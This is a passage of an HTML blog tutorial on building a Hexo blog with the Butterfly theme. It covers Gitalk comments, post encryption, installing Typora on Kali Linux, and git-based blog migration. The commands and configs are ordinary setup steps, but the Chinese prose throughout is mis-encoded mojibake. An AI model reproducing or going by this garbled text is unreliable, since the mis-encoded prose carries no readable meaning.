tags</span><br><span class="line">ä½ æœƒæ‰¾åˆ° source/tags/index.md é€™å€‹æ–‡ä»¶</span><br><span class="line">ä¿®æ”¹é€™å€‹æ–‡ä»¶ï¼š</span><br><span class="line">è¨˜å¾—æ·»åŠ  type: &quot;tags&quot;</span><br><span class="line"></span><br><span class="line">åˆ†ç±»é¡µï¼š</span><br><span class="line">å‰å¾€ä½ çš„ Hexo åšå®¢çš„æ ¹ç›®éŒ„</span><br><span class="line">è¼¸å…¥ hexo new page categories</span><br><span class="line">ä½ æœƒæ‰¾åˆ° source/categories/index.md é€™å€‹æ–‡ä»¶</span><br><span class="line">ä¿®æ”¹é€™å€‹æ–‡ä»¶ï¼š</span><br><span class="line">è¨˜å¾—æ·»åŠ  type: &quot;categories&quot;</span><br><span class="line"></span><br><span class="line">å‹æƒ…é“¾æ¥ï¼š</span><br><span class="line">å‰å¾€ä½ çš„ Hexo åšå®¢çš„æ ¹ç›®éŒ„</span><br><span class="line">è¼¸å…¥ hexo new page link</span><br><span class="line">ä½ æœƒæ‰¾åˆ° source/link/index.md é€™å€‹æ–‡ä»¶</span><br><span class="line">ä¿®æ”¹é€™å€‹æ–‡ä»¶ï¼š</span><br><span class="line">è¨˜å¾—æ·»åŠ  type: &quot;link&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">https://butterfly.js.org/posts/dc584b87</span><br></pre></td></tr></table></figure><h2 id="3ã€æ–‡ç« æ’å…¥æœ¬åœ°å›¾ç‰‡"><a href="#3ã€æ–‡ç« æ’å…¥æœ¬åœ°å›¾ç‰‡" class="headerlink" title="3ã€æ–‡ç« æ’å…¥æœ¬åœ°å›¾ç‰‡"></a>3ã€æ–‡ç« æ’å…¥æœ¬åœ°å›¾ç‰‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1ã€å®‰è£…ä¸€ä¸ªæ’ä»¶ï¼ˆå¤åˆ¶ä¸è¡Œå°±æ‰‹æ‰“ï¼‰</span><br><span class="line">npm install hexo-renderer-marked</span><br><span class="line">2ã€ä¿®æ”¹_config.ymlæ–‡ä»¶ï¼š</span><br><span class="line">post_asset_folder: true</span><br><span class="line">3ã€ä¹‹åhexo newçš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾å›¾ç‰‡çš„</span><br><span class="line">4ã€å®Œæˆåå³å¯åœ¨mdæ–‡ä»¶ä¸­å¼•ç”¨ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</span><br><span class="line">![æ ‡é¢˜](å›¾ç‰‡æ–‡ä»¶å)</span><br><span class="line">![123](123.jpg)</span><br><span class="line"></span><br><span class="line">åç»­è®¾ç½®ï¼šhttps://zhuanlan.zhihu.com/p/265077468</span><br></pre></td></tr></table></figure><h2 id="4ã€æ–‡ç« å¤´éƒ¨è®¾ç½®"><a href="#4ã€æ–‡ç« å¤´éƒ¨è®¾ç½®" class="headerlink" title="4ã€æ–‡ç« å¤´éƒ¨è®¾ç½®"></a>4ã€æ–‡ç« å¤´éƒ¨è®¾ç½®</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">title: Hexo ä¸ªäººåšå®¢æ­å»º</span><br><span class="line">date: 2024-01-07 20:11:08</span><br><span class="line">tags: 1.0 #æ ‡ç­¾</span><br><span class="line">categories: åŸºç¡€çŸ¥è¯† #åˆ†ç±»</span><br><span class="line">description: hexoä¸ªäººåšå®¢åŠ butterflyä¸»é¢˜æ­å»º #æè¿°</span><br><span class="line">top_img: /img/010.jpg #é¡¶éƒ¨èƒŒæ™¯å›¾</span><br><span class="line">cover: /img/1.jpg #æ–‡ç« å°é¢</span><br></pre></td></tr></table></figure><h2 id="5ã€åšå®¢å†…éƒ¨æ–‡ç« è·³è½¬"><a href="#5ã€åšå®¢å†…éƒ¨æ–‡ç« è·³è½¬" class="headerlink" title="5ã€åšå®¢å†…éƒ¨æ–‡ç« è·³è½¬"></a>5ã€åšå®¢å†…éƒ¨æ–‡ç« è·³è½¬</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">&#123;% post_link æ–‡ç« æ–‡ä»¶åï¼ˆä¸è¦åç¼€ï¼‰ æ–‡ç« æ ‡é¢˜ï¼ˆå¯é€‰ï¼‰ %&#125;</span><br><span class="line"></span><br><span class="line">#å¦‚è·³è½¬è‡³æ–‡ç« æ–‡ä»¶åä¸ºHello-World.mdï¼š</span><br><span class="line">&#123;% post_link Hello-World %&#125;</span><br><span class="line">&#123;% post_link Hello-World ä½ å¥½ä¸–ç•Œ %&#125;</span><br></pre></td></tr></table></figure><h2 id="6ã€å›¾ç‰‡æ‡’åŠ è½½"><a href="#6ã€å›¾ç‰‡æ‡’åŠ è½½" class="headerlink" title="6ã€å›¾ç‰‡æ‡’åŠ è½½"></a>6ã€å›¾ç‰‡æ‡’åŠ è½½</h2><p>åœ¨<code>_config.yml</code>ä¸­æ·»åŠ å¦‚ä¸‹ï¼Œéœ€è¦ä¿è¯loading.gif æ–‡ä»¶å­˜åœ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: true</span><br><span class="line">  loadingImg: /img/loading.gif</span><br></pre></td></tr></table></figure><h2 id="7ã€è¯„è®ºåŠŸèƒ½-Gitalké…ç½®"><a href="#7ã€è¯„è®ºåŠŸèƒ½-Gitalké…ç½®" class="headerlink" title="7ã€è¯„è®ºåŠŸèƒ½-Gitalké…ç½®"></a>7ã€è¯„è®ºåŠŸèƒ½-Gitalké…ç½®</h2><p>åœ¨_config.butterfly.yml é…ç½®æ–‡ä»¶ä¸­é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">comments:</span><br><span class="line">  use: Gitalk # Valine,Disqus # ä½¿ç”¨çš„è¯„è®ºï¼Œæœ€å¤šæ”¯æŒä¸¤ä¸ª</span><br><span class="line">  text: true # æ˜¯å¦æ˜¾ç¤ºè¯„è®ºäººçš„åç§°</span><br><span class="line">  lazyload: true # å¼€å¯åï¼Œåªæœ‰è½®åŠ¨åˆ°è¯„è®ºåŒºæ‰åŠ è½½è¯„è®ºèµ„æºï¼Œä½†è¯„è®ºæ•°ä¸å†æ˜¾ç¤º</span><br><span class="line">  count: true # æ˜¯å¦åœ¨æ–‡ç« é ‚éƒ¨é¡¯ç¤ºè©•è«–æ•¸ã€‚livereã€Giscus å’Œ utterances ä¸æ”¯æŒè¯„è®ºæ•°æ˜¾ç¤º </span><br><span class="line">  card_post_count: false # æ˜¯å¦åœ¨é¦–é æ–‡ç« å¡ç‰‡é¡¯ç¤ºè©•è«–æ•¸</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»å³ä¸Šè§’å¤´åƒã€Settingsã€‘-&gt;ã€Developer settingsã€‘-&gt;ã€OAuth Appsã€‘-&gt;ã€New OAuth Appã€‘è¿›è¡Œæ–°å»ºOAuth app</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20241003032618677.png" alt="image-20241003032618677"></p><p>è·å¾—Client ID å’Œ Client secrets</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20241003032837312.png" alt="image-20241003032837312"></p><p>é…ç½®Gitalk</p><p>å¿…å¡«çš„æœ‰clientID&#x2F;clientSecret&#x2F;repo&#x2F;owner&#x2F;adminäº”ä¸ªã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gitalk:</span><br><span class="line">  # enable: true</span><br><span class="line">  client_id: OxxxxxxxxxxxxN</span><br><span class="line">  client_secret: 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxd</span><br><span class="line">  repo: lusensec.github.io</span><br><span class="line">  owner: Lusensec</span><br><span class="line">  admin: Lusensec</span><br></pre></td></tr></table></figure><p>ä¹‹åé‡æ–°å‘å¸ƒå³å¯</p><h2 id="8ã€hexoé•¶åµŒBç«™è§†é¢‘"><a href="#8ã€hexoé•¶åµŒBç«™è§†é¢‘" class="headerlink" title="8ã€hexoé•¶åµŒBç«™è§†é¢‘"></a>8ã€hexoé•¶åµŒBç«™è§†é¢‘</h2><p>å°†ä¸‹é¢çš„src çš„å†…å®¹æ›¿æ¢æˆBç«™è§†é¢‘çš„åˆ†äº«ä¸‹é¢çš„ã€é•¶åµŒä»£ç ã€‘çš„é“¾æ¥ï¼ˆè€Œä¸æ˜¯è§†é¢‘çš„åˆ†äº«é“¾æ¥ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line">&lt;div style=&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;//player.bilibili.com/player.html?aid=90978812&amp;cid=155358422&amp;page=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot; style=&quot;position: absolute; width: 100%; height: 100%; Left: 0; top: 0;&quot; &gt;&lt;/iframe&gt;&lt;/div&gt;</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><h2 id="9ã€åŠ è½½åŠ¨ç”»"><a href="#9ã€åŠ è½½åŠ¨ç”»" class="headerlink" title="9ã€åŠ è½½åŠ¨ç”»"></a>9ã€åŠ è½½åŠ¨ç”»</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">preloader:</span><br><span class="line">  enable: true</span><br><span class="line">  # source</span><br><span class="line">  # 1. fullpage-loading</span><br><span class="line">  # 2. pace (progress bar)</span><br><span class="line">  source: 1</span><br><span class="line">  # pace theme (see https://codebyzach.github.io/pace/)</span><br><span class="line">  pace_css_url:</span><br></pre></td></tr></table></figure><h2 id="10ã€è®¾ç½®é¼ æ ‡æ ·å¼"><a href="#10ã€è®¾ç½®é¼ æ ‡æ ·å¼" class="headerlink" title="10ã€è®¾ç½®é¼ æ ‡æ ·å¼"></a>10ã€è®¾ç½®é¼ æ ‡æ ·å¼</h2><p>1ã€ç¬¬ä¸€æ­¥ï¼šåœ¨ &#96;&#96;&#x2F;themes&#x2F;butterfly&#x2F;source&#x2F;css<code>è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ª</code>mouse.css&#96;æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/* ä¸ºæ•´ä¸ªé¡µé¢è®¾ç½®é¼ æ ‡æ ·å¼ */</span><br><span class="line">body &#123;</span><br><span class="line">    cursor: url(&#x27;path/to/your/custom-cursor.cur&#x27;), auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* ä¸ºé“¾æ¥è®¾ç½®é¼ æ ‡æ ·å¼ */</span><br><span class="line">a &#123;</span><br><span class="line">    cursor: url(&#x27;path/to/your/link-cursor.cur&#x27;), pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* ä¸ºå›¾ç‰‡è®¾ç½®é¼ æ ‡æ ·å¼ */</span><br><span class="line">img &#123;</span><br><span class="line">    cursor: url(&#x27;path/to/your/image-cursor.cur&#x27;), pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* ä¸ºæŒ‰é’®è®¾ç½®é¼ æ ‡æ ·å¼ */</span><br><span class="line">button &#123;</span><br><span class="line">    cursor: url(&#x27;path/to/your/button-cursor.cur&#x27;), pointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2ã€ç¬¬äºŒæ­¥ï¼šå¼•å…¥CSSæ–‡ä»¶ï¼Œæ‰“å¼€ç«™ç‚¹çš„ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.ymlï¼Œæ‰¾åˆ°injectéƒ¨åˆ†ï¼Œåœ¨headå¤„ç›´æ¥å¼•å…¥è¯¥æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inject:</span><br><span class="line">    head:</span><br><span class="line">    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/mouse.css&quot;&gt;</span><br></pre></td></tr></table></figure><p>3ã€ç¬¬ä¸‰æ­¥ï¼šé‡æ–°éƒ¨ç½²</p><h2 id="11ã€æ–‡ç« åŠ å¯†åŠŸèƒ½"><a href="#11ã€æ–‡ç« åŠ å¯†åŠŸèƒ½" class="headerlink" title="11ã€æ–‡ç« åŠ å¯†åŠŸèƒ½"></a>11ã€æ–‡ç« åŠ å¯†åŠŸèƒ½</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>åœ¨_config.yml ä¸­é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># åŠ å¯†é…ç½®</span><br><span class="line">encrypt:</span><br><span class="line">  enable: true</span><br><span class="line">  default_abstract: è¯¥æ–‡ç« å·²åŠ å¯†ï¼Œè¯·è¾“å…¥å¯†ç æŸ¥çœ‹ã€‚</span><br><span class="line">  default_message: è¯·è¾“å…¥å¯†ç è®¿é—®</span><br><span class="line">  # default_password: mydefaultpassword  # ï¼ˆå¯é€‰ï¼‰å…¨å±€é»˜è®¤å¯†ç </span><br></pre></td></tr></table></figure><p>ä¹‹åå¯ä»¥åœ¨scaffolds çš„ post.md æ–‡ä»¶ä¸­åŠ å…¥ä»¥ä¸‹å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password: å¯†ç </span><br><span class="line">message: Hey, è¿™ç¯‡æ–‡ç« è¢«åŠ å¯†äº†ï¼Œè¯·è¾“å…¥å¯†ç ï¼</span><br><span class="line">wrong_pass_message: Oh, å¯†ç é”™äº†ï¼Œæ£€æŸ¥ä¸€ä¸‹å¥½å—ï½</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œæ–‡ç« çš„å¤´éƒ¨ä¼šå¤šå‡ºä»¥ä¸Šä¸‰ä¸ªå­—æ®µï¼Œå°†å¯†ç å¡«å†™åˆ°å¯¹åº”çš„password åé¢å³å¯ï¼Œå¦‚æœä¸éœ€è¦å¯†ç ï¼Œåˆ é™¤è¿™ä¸‰ä¸ªå­—æ®µã€‚</p><h1 id="äº”ã€Linuxå®‰è£…Typora"><a href="#äº”ã€Linuxå®‰è£…Typora" class="headerlink" title="äº”ã€Linuxå®‰è£…Typora"></a>äº”ã€Linuxå®‰è£…Typora</h1><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.typora.net/364.html">åœ¨Linuxä¸Šå®‰è£…Typora | typoraä¸­æ–‡ç½‘</a></p><p>Typora æ˜¯ä¸€æ¬¾æµè¡Œçš„Markdownç¼–è¾‘å™¨ï¼Œæ”¯æŒå¤šç§æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬Linuxã€‚æ ¹æ®æœç´¢ç»“æœ[^12^]ï¼ŒTypora å¯ä»¥åœ¨ Kali Linux ä¸Šå®‰è£…å’Œè¿è¡Œã€‚å®‰è£…Typoraçš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><p>å¯¼å…¥Typoraçš„å®˜æ–¹GPGå¯†é’¥ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add -</span><br></pre></td></tr></table></figure></li><li><p>æ·»åŠ Typoraçš„APTä»“åº“ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\ndeb https://typora.io/linux ./&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/apt/sources.list</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ–°æœ¬åœ°APTä»“åº“ç´¢å¼•ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…Typoraï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install typora</span><br></pre></td></tr></table></figure></li></ol><p>å¦‚æœåœ¨å®‰è£…è¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£æˆ–ç¤¾åŒºæä¾›çš„è§£å†³æ–¹æ¡ˆã€‚ä¾‹å¦‚ï¼Œå¦‚æœé‡åˆ°SUID sandbox helper binaryé…ç½®é—®é¢˜ï¼Œå¯ä»¥å°è¯•è®¾ç½®æ­£ç¡®çš„æƒé™ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 4755 /usr/share/typora/chrome-sandbox</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œå¦‚æœé‡åˆ°NSSç‰ˆæœ¬è¿‡æ—¶çš„é—®é¢˜ï¼Œå¯ä»¥ç¡®ä¿å®‰è£…äº†æœ€æ–°çš„NSSåº“ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install libnss3</span><br></pre></td></tr></table></figure><p>è¿™äº›æ­¥éª¤å’Œè§£å†³æ–¹æ¡ˆåº”è¯¥å¯ä»¥å¸®åŠ©ä½ åœ¨Kali Linuxä¸ŠæˆåŠŸå®‰è£…å¹¶è¿è¡ŒTyporaã€‚</p><h1 id="å…­ã€Hexoåšå®¢è¿ç§»"><a href="#å…­ã€Hexoåšå®¢è¿ç§»" class="headerlink" title="å…­ã€Hexoåšå®¢è¿ç§»"></a>å…­ã€Hexoåšå®¢è¿ç§»</h1><h2 id="1ã€gitå¤‡ä»½è¿ç§»"><a href="#1ã€gitå¤‡ä»½è¿ç§»" class="headerlink" title="1ã€gitå¤‡ä»½è¿ç§»"></a>1ã€gitå¤‡ä»½è¿ç§»</h2><p>å‚è€ƒé“¾æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV13g41147yV/</span><br><span class="line">https://wokron.github.io/posts/hexo-blog-migration/</span><br></pre></td></tr></table></figure><p>1ã€åˆ›å»ºGiteeæˆ–Github ç§äººä»“åº“</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240611221405736.png" alt="image-20240611221405736"></p><p>2ã€é“¾æ¥ç§äººä»“åº“ã€‚ä¸¥æ ¼æŒ‰ç…§è¿™é‡Œæ¥</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240611221447804.png" alt="image-20240611221447804"></p><p>åœ¨åšå®¢ç›®å½•ä¸‹æ‰§è¡Œï¼ˆæœ€å¥½åœ¨gitçš„bash ä¸‹æ‰§è¡Œï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;xxx@xxx&quot;</span><br><span class="line"></span><br><span class="line">git init </span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin https://gitee.com/lusensec/hexo_backup.git</span><br><span class="line">git push -u origin &quot;master&quot;</span><br><span class="line"></span><br><span class="line">//å¦‚æœhexoæœ‰ä¸»é¢˜ï¼Œå¯¼è‡´å‡ºé”™ï¼ŒæŠŠthemesæ–‡ä»¶å¤¹å…ˆç§»åŠ¨èµ°ï¼Œç­‰è¿ç§»æˆåŠŸåå†è¦†ç›–themes</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œæ‰€æœ‰çš„åšå®¢å†…å®¹éƒ½å°†ä¸Šä¼ åˆ°ä»“åº“</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240612134929139.png" alt="image-20240612134929139"></p><p>3ã€è¿ç§»è‡³å…¶ä»–åœ°æ–¹</p><p>åœ¨è¦è¿ç§»çš„ç©ºç™½æ–‡ä»¶å¤¹å…‹éš†è¯¥åšå®¢å¤‡ä»½ä»“åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@gitee.com:lusensec/hexo_backup.git</span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-hexo-build/image-20240612135223145.png" alt="image-20240612135223145"></p><p>ä¹‹åä½¿ç”¨npm é‡æ–°åŠ è½½é…ç½®é¡¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬å°†é‡æ–°éƒ¨ç½²</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240612135505611.png" alt="image-20240612135505611"></p><h2 id="2ã€æœ¬åœ°è¿ç§»"><a href="#2ã€æœ¬åœ°è¿ç§»" class="headerlink" title="2ã€æœ¬åœ°è¿ç§»"></a>2ã€æœ¬åœ°è¿ç§»</h2><p>è¿™é‡Œç›´æ¥ç”¨ä¸€ç§ç²—æš´çš„æ–¹æ³•ï¼Œå¯¹hexoåšå®¢æ–‡ä»¶å¤¹å’Œæ–‡ä»¶å¤‡ä»½åˆ°æœ¬åœ°æˆ–ç¡¬ç›˜ï¼Œéœ€è¦å¤‡ä»½çš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">source æ–‡ä»¶å¤¹ï¼šåŒ…å«æ‰€æœ‰æ–‡ç« çš„Markdownæ–‡ä»¶ã€‚</span><br><span class="line">themes æ–‡ä»¶å¤¹ï¼šå¦‚æœä½ æœ‰è‡ªå®šä¹‰çš„ä¸»é¢˜æˆ–ä¿®æ”¹è¿‡çš„ä¸»é¢˜ã€‚</span><br><span class="line">_config.yml å’Œå…¶ä»–é…ç½®æ–‡ä»¶ï¼šåŒ…å«åšå®¢çš„é…ç½®ä¿¡æ¯ã€‚ï¼ˆ_config.butterfly.ymlã€package.jsonï¼‰</span><br><span class="line">node_modules æ–‡ä»¶å¤¹ï¼šåŒ…å«æ‰€æœ‰ä¾èµ–çš„Node.jsæ¨¡å—ã€‚</span><br><span class="line">public æ–‡ä»¶å¤¹ï¼šåŒ…å«ç”Ÿæˆçš„é™æ€æ–‡ä»¶ï¼Œå¦‚æœä½ å¸Œæœ›ä¿ç•™æ—§çš„æ„å»ºç»“æœã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›´æ¥å°†ä¸Šè¿°æ–‡ä»¶å¤¹å’Œæ–‡ä»¶è¿›è¡Œå‹ç¼©å¤‡ä»½ï¼Œæˆ–è€…ç›´æ¥å¤åˆ¶åˆ°ä¸€ä¸ªå¤–éƒ¨å­˜å‚¨è®¾å¤‡ï¼Œå¦‚Uç›˜ã€ç§»åŠ¨ç¡¬ç›˜æˆ–äº‘å­˜å‚¨ã€‚</p><p>ä¹‹ååœ¨æ–°çš„è®¾å¤‡è·¯å¾„å®‰è£…ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo init new_blog_folder</span><br><span class="line">cd new_blog_folder</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>ä¹‹åå°†å¤‡ä»½çš„èµ„æºå¤åˆ¶åˆ°æ–°ç”µè„‘ä¸Šçš„Hexoé¡¹ç›®æ–‡ä»¶å¤¹ä¸­ï¼Œæ›¿æ¢æ‰æ–°åˆ›å»ºçš„é¡¹ç›®çš„å¯¹åº”æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ã€‚</p><p>è¿™å°†æ ¹æ®package.json æ–‡ä»¶å®‰è£…æ‰€æœ‰å¿…è¦çš„ä¾èµ–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥å¹¶æ›´æ–°_config.ymlå’Œå…¶ä»–é…ç½®æ–‡ä»¶ï¼Œç¡®ä¿å®ƒä»¬é€‚ç”¨äºæ–°ç¯å¢ƒã€‚</p><p>ä¹‹åé‡æ–°è¿›è¡Œæœ¬åœ°å’Œè¿œç«¯éƒ¨ç½²ã€‚</p><h1 id="ä¸ƒã€é‡åˆ°çš„å‘"><a href="#ä¸ƒã€é‡åˆ°çš„å‘" class="headerlink" title="ä¸ƒã€é‡åˆ°çš„å‘"></a>ä¸ƒã€é‡åˆ°çš„å‘</h1><h2 id="1ã€ä»€ä¹ˆä»€ä¹ˆ-is-eâ€™mpty-ä»¥åŠ-master-é”™è¯¯"><a href="#1ã€ä»€ä¹ˆä»€ä¹ˆ-is-eâ€™mpty-ä»¥åŠ-master-é”™è¯¯" class="headerlink" title="1ã€ä»€ä¹ˆä»€ä¹ˆ is eâ€™mpty ä»¥åŠ master é”™è¯¯"></a>1ã€ä»€ä¹ˆä»€ä¹ˆ is eâ€™mpty ä»¥åŠ master é”™è¯¯</h2><p><img src="/img/Extracurricular-experience-hexo-build/image-20240218124007996.png" alt="image-20240218124007996"></p><p><strong>è§£å†³åŠæ³•ï¼š</strong>å°†åšå®¢ç›®å½•ä¸‹çš„<code>.deploy_git</code>æ–‡ä»¶å¤¹åˆ é™¤ï¼Œæˆ–è€…ä»¥é˜²ä¸‡ä¸€å…ˆæŠŠè¯¥æ–‡ä»¶å¤¹ç§»åŠ¨åˆ°éåšå®¢ç›®å½•ä¸‹ï¼Œä¹‹åé‡æ–°æ‰§è¡Œä¸Šä¼ æ“ä½œå³å¯ã€‚è¿™å°†é‡æ–°ç¼–è¯‘ï¼Œè€—æ—¶è¾ƒé•¿</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240218125607789.png" alt="image-20240218125607789"></p><h2 id="2ã€GitHubè¿æ¥ä¸ä¸Š"><a href="#2ã€GitHubè¿æ¥ä¸ä¸Š" class="headerlink" title="2ã€GitHubè¿æ¥ä¸ä¸Š"></a>2ã€GitHubè¿æ¥ä¸ä¸Š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§£å†³åŠæ³•å‚è€ƒé“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/521340971</span><br></pre></td></tr></table></figure><h2 id="3ã€ç¼–è¯‘å‡ºé”™"><a href="#3ã€ç¼–è¯‘å‡ºé”™" class="headerlink" 